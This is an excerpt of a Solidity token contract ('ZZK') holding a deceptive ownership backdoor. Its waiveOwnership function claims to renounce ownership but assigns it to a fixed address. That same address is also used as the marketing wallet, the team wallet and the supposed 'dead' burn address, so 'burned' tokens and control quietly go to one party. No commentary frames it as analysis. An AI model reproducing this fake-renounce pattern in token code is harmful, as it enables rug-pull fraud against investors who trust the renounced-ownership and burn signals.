...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x7fe0197d765bF23979d8268eFd9523E8ABf5c048));
        _owner = address(0x7fe0197d765bF23979d8268eFd9523E8ABf5c048);
    }
...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "ZZK";
    string private _symbol = "ZZK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7fe0197d765bF23979d8268eFd9523E8ABf5c048);
    address payable public teamWalletAddress = payable(0x7fe0197d765bF23979d8268eFd9523E8ABf5c048);
    address public immutable deadAddress = 0x7fe0197d765bF23979d8268eFd9523E8ABf5c048;
